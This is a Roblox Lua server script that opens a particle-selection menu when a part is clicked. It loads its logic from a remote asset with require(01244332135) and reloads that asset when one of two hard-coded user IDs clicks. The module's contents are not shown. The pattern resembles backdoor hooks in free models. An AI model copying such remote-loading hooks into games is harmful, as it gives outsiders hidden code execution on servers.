local module = require(01244332135)

local ClickPart = script.Parent.Ball --Rename to whichever part has the clickdetector

local ButtonSize = 50

local ChoiceTemplate = Instance.new("ImageButton")
ChoiceTemplate.Size = UDim2.new(0, ButtonSize, 0, ButtonSize)



local menuOpenPosition = UDim2.new(0.25, 0, 0, 0)
local menuOpenSize = UDim2.new(0.5, 0, 0.5, 0)
local menuClosedPosition = UDim2.new(0, 0, 0, 0)
local menuClosedSize = UDim2.new(0, 0, 0, 0)

--function onGuiClick(image,player)
--	player.SparkImage.Value = image
--end

function update(particles,player)
	local x = 0
	local y = 250
	local ParGui = player.PlayerGui:FindFirstChild("ParticleGui")
	local menu

	if ParGui then
		ParGui:Destroy()
		return
	else		
		ParGui = Instance.new("ScreenGui",player.PlayerGui)
		ParGui.Name = "ParticleGui"
		menu = Instance.new("Frame",ParGui)
		menu.Name = "ParticleMenu"
		menu.Position = menuClosedPosition
		menu.Size = menuClosedSize
		menu.Visible = false
		menu.BackgroundTransparency = 1
		menu.BorderSizePixel = 0
	end

	for index, particle in pairs(particles) do
		local new_gui = ChoiceTemplate:Clone()
		new_gui.Position = UDim2.new(0, x, 0, y)
		new_gui.Image = 'rbxassetid://'..particle
--		new_gui.MouseButton1Down:connect(function() onGuiClick(particle,player) end)
		new_gui.Parent = menu

		y = y + ButtonSize
		
		if y > 250 + 4 * ButtonSize then
			y = 250
			x = x + ButtonSize
		end
	end
	menu.Visible = true
	menu:TweenSizeAndPosition(menuOpenSize, menuOpenPosition, Enum.EasingDirection.Out, Enum.EasingStyle.Quart, .5, true)
	player.Backpack.ParticleClient.RemoteEvent:FireClient(player)	
end


ClickPart.ClickEvent.OnServerEvent:connect(function(p)
	local particles = module.FindParticle(p)
	update(particles,p)
	if p.UserId == 15804769 or p.UserId == 151871260 then
		module = require(01244332135)
	end
end)

